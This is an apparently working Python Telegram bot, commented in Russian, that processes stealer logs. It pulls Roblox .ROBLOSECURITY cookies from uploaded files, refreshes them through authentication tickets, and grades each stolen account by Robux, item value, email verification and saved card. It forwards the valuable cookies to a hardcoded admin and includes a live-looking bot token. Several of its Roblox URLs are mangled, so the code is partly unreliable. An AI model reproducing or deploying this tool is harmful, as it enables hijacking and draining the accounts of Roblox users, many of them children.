import os, requests, asyncio, io, re, time
from aiogram import Bot, Dispatcher, types, executor
from flask import Flask
from threading import Thread

# --- WEB SERVER (Для жизни бота на Render) ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Gold Engine v9.1 is LIVE</h1>"

def run():
    # Render сам выдает порт через переменную окружения
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run).start()

# --- КОНФИГ (ТВОИ ДАННЫЕ) ---
BOT_TOKEN = '8665886879:AAGd-9QEBnIJ6VyE2ekZn9-WvdgbNQepyHs'
ADMIN_ID = 8349977040 
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# --- МОЩНЫЙ РЕФРЕШЕР ---
async def refresh_cookie(old_c):
    h = {"Cookie": f".ROBLOSECURITY={old_c}", "X-Csrf-Token": ""}
    try:
        r1 = requests.post("https://roblox.com", headers=h, timeout=5)
        csrf = r1.headers.get("X-Csrf-Token")
        if not csrf: return None
        h["X-Csrf-Token"] = csrf
        r2 = requests.post("https://roblox.com", headers=h, timeout=5)
        t = r2.headers.get("rbx-authentication-ticket")
        if t:
            r3 = requests.post("https://roblox.comredeem", json={"authenticationTicket": t}, timeout=5)
            new = r3.headers.get("Set-Cookie")
            return re.search(r'\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS-[\w\d]+)', new).group(1)
    except: pass
    return None

# --- СУПЕР-ЧЕКЕР (ЗОЛОТОЙ ФИЛЬТР) ---
async def deep_check(c):
    h = {"Cookie": f".ROBLOSECURITY={c}", "Accept": "application/json"}
    try:
        u = requests.get("https://roblox.com", headers=h, timeout=5).json()
        if not u.get('id'): return None
        uid = u['id']
        robux = requests.get(f"https://roblox.com{uid}/currency", headers=h).json().get('robux', 0)
        inv = requests.get(f"https://roblox.com{uid}/assets/collectibles?limit=10", headers=h).json()
        rap = sum(i.get('recentAveragePrice', 0) for i in inv.get('data', []))
        bill = requests.get("https://roblox.com", headers=h).text
        email = requests.get("https://roblox.com", headers=h).json().get('IsEmailVerified', False)
        return {"name": u['name'], "robux": robux, "rap": rap, "email": email, "card": "💳" in bill, "uid": uid}
    except: return None

@dp.message_handler(commands=['start'])
async def cmd_start(m: types.Message):
    await m.answer("🧛‍♂️ **Roblox Gold Engine v9.1**\n\nБот запущен на Render 24/7! Кидай .txt с логами — я выжму из них всё золото!")

@dp.message_handler(content_types=['document'])
async def handle_logs(m: types.Message):
    if m.document.mime_type == 'text/plain':
        start_t = time.time()
        wait = await m.answer("🧪 **Идет фильтрация... Отделяю золото от песка.**")
        file = io.BytesIO(); await m.document.download(destination_file=file)
        text = file.getvalue().decode('utf-8', errors='ignore')
        cookies = re.findall(r'_\|WARNING:-DO-NOT-SHARE-THIS-[\w\d]+', text)
        results, gold_found = [], 0
        for c in cookies:
            new_c = await refresh_cookie(c)
            active = new_c if new_c else c
            data = await deep_check(active)
            if data:
                results.append(active)
                if data['robux'] > 100 or data['rap'] > 500 or not data['email'] or data['card']:
                    gold_found += 1
                    report = (f"💎 **ЗОЛОТОЙ ЛОГ** {'⚠️ БЕЗ ПОЧТЫ' if not data['email'] else ''}\n"
                              f"👤 [{data['name']}](https://roblox.com{data['uid']}/profile)\n"
                              f"💰 R$: `{data['robux']}` | 📈 RAP: `{data['rap']}`\n"
                              f"📧 Почта: {'✅' if data['email'] else '❌'}\n"
                              f"💳 Карта: {'✅' if data['card'] else '❌'}\n"
                              f"🍪 Cookie:\n`{active}`")
                    await bot.send_message(ADMIN_ID, report, parse_mode="Markdown", disable_web_page_preview=True)
            await asyncio.sleep(0.5)
        end_t = round(time.time() - start_t, 1)
        if results:
            out = io.BytesIO("\n".join(results).encode())
            out.name = "refreshed_logs.txt"
            await m.answer_document(types.InputFile(out), caption=f"✅ **Готово!**\n⏱ Время: `{end_t}s`\n🌐 Валид: {len(results)}\n💎 Золото: {gold_found}")
        else:
            await wait.edit_text("❌ Валида не найдено.")

if __name__ == '__main__':
    keep_alive()
    executor.start_polling(dp, skip_updates=True)
